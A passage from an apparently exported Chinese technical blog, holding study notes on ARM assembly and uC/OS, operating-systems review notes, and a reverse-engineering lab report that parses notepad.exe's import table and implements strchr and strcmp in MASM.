SETS(A/L)—-赋值</li>\n<li>Reglist RLIST {R0-R5,R8,R10} 定义寄存器列表</li>\n<li>LTORG声明一个数据缓冲(literal pool)的开始</li>\n<li>MAP 0x100,R0定义结构化内存表首地址的值为0x100＋R0 MAP=^ FIELD=# 都仅用于定义数据结构，并不实际分配存储单元</li>\n<li>DataSpace  SPACE  100分配连续100字节的存储单元并初始化为0 SPACE=%</li>\n<li>Str DCB “This is a test!”分配一片连续的字节存储单元并初始化 DCB==</li>\n<li>DataTest DCW 1,2,3分配一片连续的半字存储单元并初始化(DCWU不要求半字对齐) DCD=&amp;</li>\n<li>AREA Init,CODE,READONLY,ALIEN=3指定后面的指令为8字节对齐</li>\n<li>EQU=*</li>\n<li>EXPORT声明一个全局的标号，该标号可在其他的文件中引用<br>IMPORT通知编译器要使用的标号在其他的源文件中定义，但要在当前源文件中引用(无论用不用都会加入当前源文件符号表，与extern区别)<br>可以使用INCLUDE代替GET</li>\n<li>start    MOV R0,#0<br>ADR R1,start  –&gt;变为SUB R1,pc,#0xC</li>\n<li>BL指令完成两个操作：将返回地址放在LR寄存器中、将PC寄存器值设置成目标子程序的首地址<br>存储器最基本的参数是容量和数据宽度<br>Nor Flash读速度快，用来存储代码;Nand Flash常用来存储数据<br>嵌入式软件的特性：规模小，开发难度大/快速启动，直接运行/实时性和可靠性要求高/开发平台和运行平台各不相同<br>软实时RTOS:嵌入式Linux/WinCE,硬实时RTOS:VxWorks/OSE/Nuclear,著名的open RTOS:uC/OS/TEMS,自主知识产权的RTOS:HOPEN/Delta OS</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"第四部分-UC-OS\"><a href=\"#第四部分-UC-OS\" class=\"headerlink\" title=\"第四部分-UC/OS\"></a>第四部分-UC/OS</h1><ol>\n<li><p>UC/OS–II 2.5版本支持最多64个任务。每个任务有一个特定的优先级，优先级越高，其数值越小<br>运行状态：运行、就绪、挂起、中断、休眠</p>\n</li>\n<li><p>系统设计：需求分析-&gt;总体设计-&gt;硬件开发及过程控制/代码生成-&gt;系统联调/程序固化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AREA  Block，CODE，READONLY ;设置本段程序的名\t\t\t\t\t\t;称（Block）及属性</span><br><span class=\"line\">num\tEQU  20\t   ;设置将要复制的字数</span><br><span class=\"line\">\t\tENTRY      \t   ;标识程序入口点</span><br><span class=\"line\">Start\tLDR  r0，=src  ;r0寄存器指向源数据区src</span><br><span class=\"line\">\t\tLDR  r1，=dst  ;r1寄存器指向目标数据区dst</span><br><span class=\"line\">\t\tMOV  r2;#num ;r2指定将要复制的字数</span><br><span class=\"line\">\t\tMOV  sp，#0x400 ;设置数据栈指针（r13），</span><br><span class=\"line\">\t\t\t\t ;用于保存工作寄存器数值</span><br><span class=\"line\">Blockcopy            \t;进行以8个字为单位的数据复制</span><br><span class=\"line\">  \t\tMOVS  r3，r2，LSR ＃3 ;需要进行的以8个字</span><br><span class=\"line\">\t\t\t\t\t;为单位的复制次数</span><br><span class=\"line\">\t\tBEQ   Copywords \t;对于剩下不足8个字的数据，</span><br><span class=\"line\">\t\t\t\t\t;跳转到copywords，以字为单位复制</span><br><span class=\"line\">   \tSTMFD  sp!，｛r4-r11｝;保存工作寄存器</span><br><span class=\"line\"></span><br><span class=\"line\">Octcopy</span><br><span class=\"line\">\t\tLDMIA  r0!，｛r4-r11｝;从源数据区读取8个字的数据， </span><br><span class=\"line\">\t\t\t\t;放到8个寄存器中，并更新源数据区指针r0</span><br><span class=\"line\">\t\tSTMIA  r1!，｛r4-r11｝;将这8个字数据写入到目标数据</span><br><span class=\"line\">\t\t\t\t\t;区中，并更新目标数据区指针r1</span><br><span class=\"line\">\t\tSUBS  r3，r3，#1      ;将块复制次数减1</span><br><span class=\"line\">\t\tBNE   Octcopy    ;循环，直到完成以8个字为单位的块复制</span><br><span class=\"line\">\t\tLDMFD  sp!，&#123;r4-r11&#125;  ;恢复工作寄存器值</span><br><span class=\"line\">Copywords</span><br><span class=\"line\">\t\tANDS  r2，r2，#7       ;剩下不足8个字的数据的字数</span><br><span class=\"line\">\t\tBEQ   Stop             ;数据复制完成</span><br><span class=\"line\">Wordcopy</span><br><span class=\"line\">\t\tLDR   r3，[r0]，＃4 ;从源数据区读取1个字的数据，</span><br><span class=\"line\">\t\t\t\t;放到r3寄存器中并更新目标数据区指针r0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSTR  r3，［r1］，＃4 \t;将这r3中数据写入到目标数据区中，</span><br><span class=\"line\">\t\t\t\t\t;并更新目标数据区指针r1</span><br><span class=\"line\">\t\tSUBS r2，r2，＃l \t;将字数减l</span><br><span class=\"line\">\t\tBNE  Wordcopy   \t;循环，直到完成以字为单位的数据复制</span><br><span class=\"line\">Stop\tMOV  r0， #0x18\t;程序退出</span><br><span class=\"line\">\t\tLDR  r1，=0x20026</span><br><span class=\"line\">\t\tSWI  0x123456</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tAREA  BlockData ，DATA，READWRITE ;定义数据区</span><br><span class=\"line\">Src\tDCD  1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4  ;定义源数据区src</span><br><span class=\"line\">Dst\tDCD  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0  ;定义目标数据区dst</span><br><span class=\"line\">\t\tEND  \t\t\t;结束汇编</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">AREA  Jump，CODE，READONLY \t\t;设置本段程序的</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t;名称（Jump）及属性</span><br><span class=\"line\">num\tEQU  2 \t\t\t\t\t\t\t;跳转表中的子程序个数</span><br><span class=\"line\">\t\tENTRY        \t\t\t\t;程序执行的入口点</span><br><span class=\"line\">Start</span><br><span class=\"line\">\t\tMOV   r0，#0 \t\t\t\t;设置3个参数，然后调用子程序\t\t\t\t\t\t\t\t\t\t;arithfunc，进行算术运算</span><br><span class=\"line\">\t\tMOV   r1，#3 </span><br><span class=\"line\">\t\tMOV   r2，#2</span><br><span class=\"line\">\t\tBL    arithfunc  \t\t\t\t;调用子程序arithfunc</span><br><span class=\"line\">Stop\t\t\t\t\t\t\t\t\t;程序退出</span><br><span class=\"line\">\t\tMOV  r0， #0x18</span><br><span class=\"line\">\t\tLDR  r1，=0x20026</span><br><span class=\"line\">\t\tSWI  0x123456</span><br><span class=\"line\">Arithfunc\t\t\t  \t\t\t\t\t;子程序arithfunc入口点</span><br><span class=\"line\">\t\tCMP   \tr0，#num      \t  \t;判断选择子程序的参数是否在</span><br><span class=\"line\">\t\t\t\t\t  \t\t\t\t;有效范围之内</span><br><span class=\"line\">\t\tMOVHS \tpc，lr   \t  \t\t;若不在，则直接返回</span><br><span class=\"line\">\t\tADR\t\tr3，JumpTable   \t;读取跳转表的基地址（ADR是伪指令）</span><br><span class=\"line\">\t\tLDR\t\tpc，[r3，r0，LSL #2] \t;根据参数r0的值跳转到</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t;相应的子程序</span><br><span class=\"line\">JumpTable</span><br><span class=\"line\">\t\tDCD\t\tDoAdd</span><br><span class=\"line\">\t\tDCD\t\tDoSub</span><br><span class=\"line\">DoAdd    \t\t\t\t\t\t\t;子程序DoAdd执行加法操作</span><br><span class=\"line\"> \t\tADD\tr0，r1，r2</span><br><span class=\"line\"> \t\tMOV\tpc，lr</span><br><span class=\"line\">DoSub \t\t\t\t\t\t\t\t;子程序DoSub执行减法操作</span><br><span class=\"line\"> \t\tSUB\tr0，r1，r2</span><br><span class=\"line\">\t\tMOV\tpc，lr</span><br><span class=\"line\">\t\tEND           \t\t\t\t;结束汇编</span><br></pre></td></tr></table></figure></li>\n</ol>\n","categories":["技术"],"tags":["嵌入式"]},{"title":"操作系统复习整理","url":"https://littleghost2016.github.io/2018/01/15/操作系统复习整理/","content":"<h1 id=\"第二章-用户接口与作业管理\"><a href=\"#第二章-用户接口与作业管理\" class=\"headerlink\" title=\"第二章-用户接口与作业管理\"></a>第二章-用户接口与作业管理</h1><ol>\n<li>作业的组成：包括程序、数据、作业控制信息</li>\n<li>作业调度:高级调度-即作业调度；中级调度-即对换调度；低级调度-即进程级调度</li>\n<li>作业调度算法：<ul>\n<li>单道批处理系统：先来先服务(FCFS)/短作业优先调度算法(SJF)/最高响应比优先调度算法(HRP)-优先调度响应比高的作业<ul>\n<li>响应比RP = 作业响应时间/作业估计运行时间 = (作业估计运行时间+作业等待时间)/作业估计运行时间 = 1+ 作业等待时间/作业估计运行时间</li>\n</ul>\n</li>\n<li>多道批处理系统：优先级调度算法/均衡调度算法</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"第三章-进程管理\"><a href=\"#第三章-进程管理\" class=\"headerlink\" title=\"第三章-进程管理\"></a>第三章-进程管理</h1><ol>\n<li>进程<ul>\n<li>程序的执行顺序执行(顺序性、封闭性、可再现性)和并发执行(宏观串行、微观并行)</li>\n<li>通过多次执行，一个程序可对应多个进程；通过调用关系，一个进程可包括多个程序。</li>\n<li>进程基本状态：运行态、就绪态、阻塞态</li>\n<li>进程调度属于低级调度–从就绪队列中按照一定的算法选择某个进程占用CPU</li>\n</ul>\n</li>\n<li>进程调度算法：先来先服务FCFS、基于优先级、时间片轮转、多级队列轮转</li>\n<li>互斥区的原则：若干个进程应一个进程进入不应互相等待、一次只允许一个进程进入、任何一个都必须在有限时间内释放所占资源</li>\n<li>信号量<br>5  信号量：公用信号量(实现进程间的互斥，初值通常设为1)、私用信号量(实现进程间的同步，初始值通常设为0或n)。信号量值的含义：&gt;= 0还有可用的资源数，&lt;0绝对值表示进程因申请该信号量表示的资源数，得不到而进入阻塞态<br>6  P，V操作都是成对出现的：互斥操作同一进程中；同步操作处于不同的进程</li>\n</ol>\n<h1 id=\"第四章-死锁：\"><a href=\"#第四章-死锁：\" class=\"headerlink\" title=\"第四章-死锁：\"></a>第四章-死锁：</h1><ol>\n<li><p>产生死锁的四个条件(破坏其一就可预防死锁)：</p>\n<blockquote>\n<p>[]内为预防死锁的方法，但都有实行的困难</p>\n</blockquote>\n<ol>\n<li>互斥使用(资源独占) [对所有资源进行SPOOLing操作]</li>\n<li>非剥夺控制(不可强占) [将资源剥夺]</li>\n<li>零散请求[进城创建时申请所有的资源]</li>\n<li>循环等待[对资源进行编号，逐序申请]</li>\n</ol>\n</li>\n<li><p>Allocation-占有的，Claim-申请的</p>\n</li>\n<li><p>资源分配图：永久性资源-&gt;找非阻塞非独立的进程，临时性资源-&gt;生产者不被阻塞就OK</p>\n</li>\n</ol>\n<h1 id=\"第五章-存储管理\"><a href=\"#第五章-存储管理\" class=\"headerlink\" title=\"第五章-存储管理\"></a>第五章-存储管理</h1><ol>\n<li><p>存储管理的任务：</p>\n<ol>\n<li>存储的分配和回收</li>\n<li>地址变换(地址在定位)</li>\n<li>存储共享和保护</li>\n<li>存储器扩展</li>\n</ol>\n</li>\n<li><p>地址重定位：</p>\n<ul>\n<li>绝对装入</li>\n<li>可重定位装入：静态再定位、动态…</li>\n</ul>\n</li>\n<li><p>内碎片是指占用分区之内未被利用的空间；外碎片是指占用分区之间未被利用的空间。</p>\n</li>\n<li><p>分区存储管理方式：单一连续分区、固定分区、可变分区(没有内碎片，有外碎片)</p>\n</li>\n<li><p>分区分配算法(某个空闲分区大小需大于或等于程序要求，若大于则分成2块，1个标为”占用”1个标为”空闲”)</p>\n<ul>\n<li>最先适应算法(释放区域临近空闲相连，则合并)</li>\n<li>最适(在所有大于或者等于要求分配长度的空闲区中挑选一个最小的分区)<ul>\n<li>|-&gt;从个别来看，外碎片较小，但从整体来看，会形成较多外碎片。较大的空闲分区可以被保留。</li>\n</ul>\n</li>\n<li>最差(空闲分区按容量递减顺序排序，取所有空闲分区最大一块)</li>\n<li>循环最先(从上次分配的地方开始查找)</li>\n</ul>\n</li>\n<li><p>页式存储管理</p>\n<ul>\n<li>每次访问数据或指令至少需要访问两次内存，第一次是查找页表，第二次才是真正访问指令或者数据<ul>\n<li>优点：没有外碎片，每个内碎片不超过页大小。一个程序不必连续存放</li>\n<li>缺点：程序全部装入内存，没有足够的空闲页面就无法执行。动态地址变换机构增加成本和降低速度。表占用内存空间，花费时间来建立和管理。不易实现共享、动态链接。</li>\n</ul>\n</li>\n<li>页表基址寄存器PTBR、页表长度寄存器PTLR</li>\n<li>联想存储器：用来存放当前运行作业的页表表项，以加速地址变换过程，称为快表。主存中的页表有时也称为慢表</li>\n<li>在进行地址变换时，变换机构根据虚拟地址字中页号同时查找快表和慢表</li>\n</ul>\n</li>\n<li><p>段式存储管理</p>\n<ul>\n<li>每次访问一个数据或者指令访问内存两次。  # 再增设一个关联寄存器，用于保存最近常用的段表项。<ul>\n<li>优点：没有内碎片，外碎片可以通过内存紧缩来消除。便于改变进程占用空间的大小。</li>\n<li>缺点：进程全部装入内存，不能实现存储扩充。</li>\n</ul>\n</li>\n<li>段表基址寄存器、段表长度寄存器。</li>\n<li>联想存储器－快表，保存正在运行进程的段表的子集（部分表项），其特点是按内容并行查找。</li>\n<li>分页是出于系统管理的需要，分段是出于用户应用的需要。一条指令或一个操作数可能会跨越两个页的分界处，而不会跨越两个段的分界处页大小是系统固定的，而段大小则通常不固定。分页是一维的，分段是二维的。通常段比页大。段式可以内存共享，而页式不能。都不能存储扩充。</li>\n</ul>\n</li>\n<li><p>段页式存储管理</p>\n<ul>\n<li>三次访问内存[访问段表得页表地址-&gt;访问页表得物理块号+页内地址的物理地址-&gt;去除指令或数据]</li>\n<li>将用户程序分为若干各段，再把每个段划分成若干个页。即将用户程序按段式划分，而将物理内存按页式划分</li>\n<li>引入联想存储器每次访问内存，同时利用段号和页号进行检索。</li>\n</ul>\n</li>\n<li><p>覆盖技术(早期作系统)与交换技术(小型分时系统)</p>\n<ul>\n<li>同：程序和数据主要放在外存，当前需要执行的部分放在内存，内外存之间进行信息交换</li>\n<li>覆盖：必要部分常驻内存，可选部分用到时再装入<ul>\n<li>缺点：对用户不透明；执行效率低；有碎片。</li>\n</ul>\n</li>\n<li>交换：内存空间紧张时某些进程暂时移到外存，外存中某些进程换进内存，占据前者所占用的区域(内存和外存之间的动态调度)<ul>\n<li>优点：增加并发执行数目；对程序员透明。</li>\n<li>缺点：增加处理机开销；整个地址空间交换，信息量大；程序换入时需要重定位。</li>\n</ul>\n</li>\n<li>交换发生在进程或作业之间，而覆盖发生在同一进程或作业内。</li>\n</ul>\n</li>\n<li><p>虚拟存储</p>\n<ol>\n<li>局部性原理：时间局部性、空间…</li>\n<li>好处：小可用内存中执行大程序；容纳更多程序并发执行；不影响编程时的程序结构(与覆盖技术比较)；提供的虚拟内存空间通常大于物理内存</li>\n<li>特征：物理内存分配不连续性，虚拟地址空间使用不连续性；与交换的比较：调入和调出是对部分虚拟地址空间进行；通过物理内存和快速外存相结合，提供大范围虚拟地址空间，但占用容量不超过物理内存和外存交换区容量之和。</li>\n<li>种类：虚拟页式、段式、段页式</li>\n<li>缺页中断：指令执行期间产生和进行处理缺页中断(不是在一条指令执行完毕之后)所缺页面调入之后，重新执行被中断的指令</li>\n<li>缺页率=缺页次数/内存访问次数</li>\n<li>分配给进程的物理页面数目越多，缺页率越低；页面很小页数多，通过调页很快适应局部性原理的要求，缺页率低；页面很大，大部分地址空间都在内存，缺页率低；页面中等大小，局部性区域只占每页的较小部分，缺页率高。[面向对象技术和多线程会破坏局部性；采用大页面，可提高从交换区调页的I/O效率]</li>\n<li>若虚拟地址空间很大而每页比较小，则进程页表太长，采用两级或多级页表</li>\n<li>调入策略：请求调页、预调页</li>\n<li>页面置换(淘汰)算法：<ul>\n<li>最佳算法OPT</li>\n<li>先进先出算法FIFO[表中若有则不动]</li>\n<li>最久未使用算法LRU(栈底最久未使用、移位寄存器(访问时最高位置1定期右移高位补0)、行1列0行最小最久二阶矩阵)[最近被访问的页面在上前]</li>\n<li>最不经常使用NFU(淘汰访问次数最少的)</li>\n<li>最近未使用算法NRU(每页设置标志位,被访问置1；置换时采用指针从当前位置查找0；指针经过的也都被修改为0，最后停留在置换页的下一页面)</li>\n</ul>\n</li>\n<li>虚拟段式(增加请求调段和段置换)、虚拟段页式</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"第六章-文件管理\"><a href=\"#第六章-文件管理\" class=\"headerlink\" title=\"第六章-文件管理\"></a>第六章-文件管理</h1><ol>\n<li><p>文件包括文件体(文件本身的信息)和文件说明(文件存储和管理信息)</p>\n</li>\n<li><p>文件类型：</p>\n<ul>\n<li>用途：系统、用户、库文件</li>\n<li>保存期限：临时、存档、永久</li>\n<li>保护方式：只读、读写、可执行、不保护</li>\n<li>UNIX中：普通、目录、特别</li>\n</ul>\n</li>\n<li><p>文件的逻辑结构：有结构文件(记录式文件)、无结构…(流式文件)</p>\n</li>\n<li><p>文件物理结构：<br>1  连续存储(顺序)：简单，课顺序存取和随机存取，速度快；文件不能动态增长，不利于插入和删除，有外部碎片<br>  2  链接结构：提高了磁盘空间利用率,无外部碎片，有利于插入和删除，可动态扩充；速度慢，不适于随机存取，指针可能出错，更多寻道次数和时间，指针占用一定空间。<br>  3  索引结构：即能顺序存取,又能随机存取，文件动态增长、插入删除，充分利用外存空间；较多寻道次数和时间，索引表带来开销(空间、时间)</p>\n<pre><code>- UNIX文件系统采用的是三级索引结构，文件系统中inode(I节点)是基本结构。\n  - di_addr[40]-&gt;文件索引表，存放文件物理盘块号，每3个字节组成一个单元，记录文件的物理盘快号，构成了13个表项的地址索引。设成40字节使得I节点大小64字节。\n    - 直接寻址：数组前10个表项直接指向文件前10个逻辑块的物理盘块地址(直接块指针)\n    - 一级间接寻址：第11个表项指向文件索引块的地址，即第11个表项登记的不是文件物理盘块号而是索引块的地址。\n    - 二级间接寻址：第12个表项指向第一个具有341个表项的间接索引块的地址。\n    - 三级间接寻址：第13个表项指向第一个具有341个表项的二级间接索引块的地址，访问的文件最大长度为：(10+341+341×341＋341×341×341)KB，将近40GB。</code></pre></li>\n<li><p>Hash文件</p>\n</li>\n<li><p>目录内容</p>\n<ul>\n<li>文件控制块(FCB)构成：文件名、文件的物理地址|文件所有者、访问权限|创建时间、最晚一次读、最晚一次写</li>\n<li>目录结构：<ul>\n<li>一级目录：结构简单|查找速度慢、不允许重名、不便于实现文件共享</li>\n<li>二级目录：为每一个用户建立一个单独的用户目录UFD(User File Directory)，系统中再建立主文件目录MFD(Master File Directory)，每个用户文件目录都占有一个目录项，包括用户名和指向该用户目录文件的指针</li>\n<li>多级目录(树状目录)：</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>空闲空间管理的数据结构通常称为磁盘分配表。<br>1  空闲区表–适用于连续文件结构<br>2  位示图–申请时在位示图中查找为0的位，归还时将对应位转置0<br>3  空闲块链接–每块有指向下一空闲块的指针，所有构成链表(不需要磁盘分配表节省，每次申请只需取出链表开头空闲块)<br>4  成组链接法–空闲块每100块为一组，每组的第一个空闲块记录下一组空闲块的物理盘块号和空闲块总数</p>\n</li>\n<li><p>文件共享–基于索引结点(静态、动态)</p>\n<ul>\n<li>会画文件共享图</li>\n</ul>\n<blockquote>\n<p>注意子进程包含父进程的所有进程</p>\n</blockquote>\n</li>\n<li><p>磁盘移臂调度算法</p>\n<ol>\n<li>先来先服务</li>\n<li>最短寻道时间优先–造成某些访问请求长期等待得不到服务</li>\n<li>扫描算法(电梯算法)–一个方向移动，该方向上有则继续扫描，否则改变移动方向</li>\n<li>循环扫描调度算法–</li>\n<li>N步循环扫描调度算法–等待队列分为N个子队列，先来先服务处理队列，队列里用循环扫描调度算法</li>\n<li>FirstN步扫描调度算法</li>\n</ol>\n</li>\n<li><p>旋转调度算法</p>\n</li>\n</ol>\n<h1 id=\"第七章-设备管理\"><a href=\"#第七章-设备管理\" class=\"headerlink\" title=\"第七章-设备管理\"></a>第七章-设备管理</h1><ol>\n<li>I/O系统的控制方式<ul>\n<li>程序控制I/O</li>\n<li>中断驱动I/O–只适于传输率较低的设备</li>\n<li>直接存储访问I/O(DMA, Direct Memory Access)–CPU只需干预I/O操作的开始和结束适于高速设备</li>\n<li>通道控制方式I/O</li>\n</ul>\n</li>\n<li>I/O设备分类<ol>\n<li>按数据组织分类：块设备(有结构设备，速率高、可寻址、常用DMA)|字符设备(无结构设备，速率低、不可寻址、常用中断驱动)</li>\n<li>数据传输率分类：低速设备、中、高</li>\n<li>资源分配角度：独占设备、共享、虚拟 </li>\n</ol>\n</li>\n<li>缓冲管理队列<ul>\n<li>自由buf队列(队尾进，队首出)</li>\n<li>设备buf队列(缓存若被分配，则进入该设备的fub队列)</li>\n<li>NODEV设备队列(队头队尾双向勾连)–避免了重复、费时的I/O操作过程，从而大大提高了系统的效率。如果要将一个缓存重新分配，只需要简单地将它从自由buf队列和设备buf队列中同时抽出，送入新的设备buf队列。实现了进程对有限缓存的共享。</li>\n</ul>\n</li>\n</ol>\n","categories":["技术"],"tags":["操作系统"]},{"title":"软件逆向工程上机作业","url":"https://littleghost2016.github.io/2018/01/12/软件逆向工程上机作业/","content":"<h1 id=\"实验一\"><a href=\"#实验一\" class=\"headerlink\" title=\"实验一\"></a>实验一</h1><p>已知notepad.exe的各节区的RVA地址/RAW偏移范围如下：</p>\n<table>\n<thead>\n<tr>\n<th>节区名称</th>\n<th>RVA起始地址</th>\n<th>节区在内存中大小</th>\n<th>RAW起始偏移量</th>\n<th>节区在外存中大小</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.text</td>\n<td>00001000H</td>\n<td>7748H</td>\n<td>00000400H</td>\n<td>7800H</td>\n</tr>\n<tr>\n<td>.data</td>\n<td>00009000H</td>\n<td>1BA8H</td>\n<td>00007C00H</td>\n<td>800H</td>\n</tr>\n<tr>\n<td>.rsrc</td>\n<td>0000B000H</td>\n<td>7F20H</td>\n<td>00008400H</td>\n<td>8000H</td>\n</tr>\n</tbody></table>\n<p>PE头中的DataDirectory[1]这一项的RAW偏移在160H～167H。</p>\n<ol>\n<li>解析notepad.exe的IMAGE_IMPORT_DESCRIPTOR数组的内容，填充下面表格：</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>OriginalFirstThunk</th>\n<th></th>\n<th>Name</th>\n<th></th>\n<th></th>\n<th>FirstThunk</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>RVA</td>\n<td>RAW</td>\n<td>RVA</td>\n<td>RAW</td>\n<td>库文件名</td>\n<td>RVA</td>\n<td>RAW</td>\n</tr>\n<tr>\n<td>00007990H</td>\n<td>00006A04H</td>\n<td>00007AACH</td>\n<td>00006EACH</td>\n<td>comdlg32.dll</td>\n<td>000012C4H</td>\n<td>000006C4H</td>\n</tr>\n<tr>\n<td>00007840H</td>\n<td>00006C40H</td>\n<td>00007AFAH</td>\n<td>00006EFAH</td>\n<td>SHELL32.dll</td>\n<td>00001174H</td>\n<td>00000574H</td>\n</tr>\n<tr>\n<td>00007980H</td>\n<td>00006D80H</td>\n<td>00007B3AH</td>\n<td>00006F3AH</td>\n<td>WINSPOOL.DRV</td>\n<td>000012B4H</td>\n<td>000006B4H</td>\n</tr>\n<tr>\n<td>000076ECH</td>\n<td>00006AECH</td>\n<td>00007B5EH</td>\n<td>00006F5EH</td>\n<td>COMCTL32.dll</td>\n<td>00001020H</td>\n<td>00000420H</td>\n</tr>\n<tr>\n<td>000079B8H</td>\n<td>00006DB8H</td>\n<td>00007C76H</td>\n<td>00007076H</td>\n<td>msvcrt.dll</td>\n<td>000012ECH</td>\n<td>000006ECH</td>\n</tr>\n<tr>\n<td>000076CCH</td>\n<td>00006ACCH</td>\n<td>00007D08H</td>\n<td>00007108H</td>\n<td>ADVAPI32.dll</td>\n<td>00001000H</td>\n<td>00000400H</td>\n</tr>\n<tr>\n<td>00007758H</td>\n<td>00006B58H</td>\n<td>000080ECH</td>\n<td>000074ECH</td>\n<td>KERNEL32.dll</td>\n<td>0000108CH</td>\n<td>0000048CH</td>\n</tr>\n<tr>\n<td>000076F4H</td>\n<td>00006AF4H</td>\n<td>0000825EH</td>\n<td>0000765EH</td>\n<td>GDI32.dll</td>\n<td>00001028H</td>\n<td>00000428</td>\n</tr>\n<tr>\n<td>00007854H</td>\n<td>00006C54H</td>\n<td>0000873CH</td>\n<td>00007B3CH</td>\n<td>USER32.dll</td>\n<td>00001188H</td>\n<td>00000588H</td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>查找所使用的KERNEL32.dll库的第一个函数的名称。</li>\n</ol>\n<p>GetCurrentThreadId  （RAW:00007424）</p>\n<ol start=\"3\">\n<li>查找该函数在IAT中的IMAGE_THUNK_DATA32结构的内容。</li>\n</ol>\n<p>7C8097B8</p>\n<ol start=\"4\">\n<li>用OllyDbg调试notepad.exe，找出该函数被装载到的实际内存地址，比较其与（3）的IMAGE_THUNK_DATA32结构内容是否相同。解释为什么。</li>\n</ol>\n<p>在不同的电脑、不同的操作系统中这个值都不相同，IAT不相同，所以实际函数被装载到内存地址也不相同。</p>\n<h1 id=\"实验二\"><a href=\"#实验二\" class=\"headerlink\" title=\"实验二\"></a>实验二</h1><p>用x86汇编语言实现以下C语言函数功能</p>\n<table>\n<thead>\n<tr>\n<th>函数</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>unsigned intstrlen(char *s);</td>\n<td>计算给定字符串的长度，不包括’\\0’在内</td>\n</tr>\n<tr>\n<td>char <em>strchr(const char</em> s,charc);</td>\n<td>查找字符串s中首次出现字符c的位置，返回首次出现c的位置的指针，如果s中不存在c则返回0</td>\n</tr>\n<tr>\n<td>intstrcmp(const char *s1,const char *s2);</td>\n<td>当s1&lt;s2时，返回为-1；当s1==s2时，返回值= 0；当s1&gt;s2时，返回1。</td>\n</tr>\n<tr>\n<td>char *strset(char *s, char c);</td>\n<td>把字符串s中的所有字符都设置成字符c</td>\n</tr>\n</tbody></table>\n<h2 id=\"实验要求\"><a href=\"#实验要求\" class=\"headerlink\" title=\"实验要求:\"></a>实验要求:</h2><ol>\n<li>学习用MASM32 + Visual Studio进行汇编程序开发的基本方法。</li>\n<li>在老师提供的程序框架下，依次实现上表中的4个函数功能。</li>\n<li>完成上机报告（word或pdf），详细陈述程序设计思路和关键语句含义。</li>\n</ol>\n<h2 id=\"实验过程及结果\"><a href=\"#实验过程及结果\" class=\"headerlink\" title=\"实验过程及结果:\"></a>实验过程及结果:</h2><h3 id=\"strchr\"><a href=\"#strchr\" class=\"headerlink\" title=\"strchr\"></a>strchr</h3><p>实验思路：使用SCASB将给定字符串诸位与chr进行比较，若一样则记录当前地址，要计算的偏移量为当前地址与开始地址的差值。</p>\n<p>代码及注释：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">; strchr.asm</span><br><span class=\"line\"></span><br><span class=\"line\">.386</span><br><span class=\"line\">.model flat, stdcall</span><br><span class=\"line\"></span><br><span class=\"line\">include kernel32.inc</span><br><span class=\"line\">includelib kernel32.lib</span><br><span class=\"line\"></span><br><span class=\"line\">include msvcrt.inc</span><br><span class=\"line\">includelib msvcrt.lib</span><br><span class=\"line\"></span><br><span class=\"line\">.data</span><br><span class=\"line\">szText  db  &quot;Reverse Engineering&quot;, 0</span><br><span class=\"line\">chr     db  &apos;i&apos;</span><br><span class=\"line\">format  db  &quot;%d&quot;, 0AH, 0</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\"></span><br><span class=\"line\">main PROC</span><br><span class=\"line\">    LEA EDI, szText             ;将字符串偏移地址送给EDI</span><br><span class=\"line\">    MOV ECX,0FFFFFFFFH          ;ECX置为-1</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    ;strchr逻辑</span><br><span class=\"line\">    ;SCAS:将AL/AX/EAX与[EDI]比较，并对EDI自增/自减</span><br><span class=\"line\">    MOV AL, chr                 ;将要比较的字符&apos;i&apos;送给AL</span><br><span class=\"line\">    MOV EBX, EDI                ;保存szText首地址</span><br><span class=\"line\">    REPNE SCASB                 ;执行SCASB逻辑</span><br><span class=\"line\">    SUB EDI, EBX                ;&apos;i&apos;在字符串中的位置=EDI-EBX</span><br><span class=\"line\"></span><br><span class=\"line\">    INVOKE crt_printf, addr format, EDI;输出结果</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    INVOKE crt_getchar</span><br><span class=\"line\">    INVOKE ExitProcess, 0</span><br><span class=\"line\">main ENDP</span><br><span class=\"line\"></span><br><span class=\"line\">END main</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image002.png\" alt=\"img\"></p>\n<h3 id=\"strcmp\"><a href=\"#strcmp\" class=\"headerlink\" title=\"strcmp\"></a>strcmp</h3><p>实验思路：使用SCASB和STOSB将两个字符串逐位进行比较。逐个比较字符的过程中，若不相等则根据实际的大小关系得出结果；若为空则比较完成，跳转到返回结果初；若相等则继续比较下一个字符。</p>\n<p>代码及注释：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">; strcmp.asm</span><br><span class=\"line\"></span><br><span class=\"line\">.386</span><br><span class=\"line\">.model flat, stdcall</span><br><span class=\"line\"></span><br><span class=\"line\">include kernel32.inc</span><br><span class=\"line\">includelib kernel32.lib</span><br><span class=\"line\"></span><br><span class=\"line\">include msvcrt.inc</span><br><span class=\"line\">includelib msvcrt.lib</span><br><span class=\"line\"></span><br><span class=\"line\">.data</span><br><span class=\"line\">format      db  &quot;%d&quot;, 0AH, 0</span><br><span class=\"line\">szText      db  &quot;Reverse Engineering&quot;, 0</span><br><span class=\"line\">szText2     db  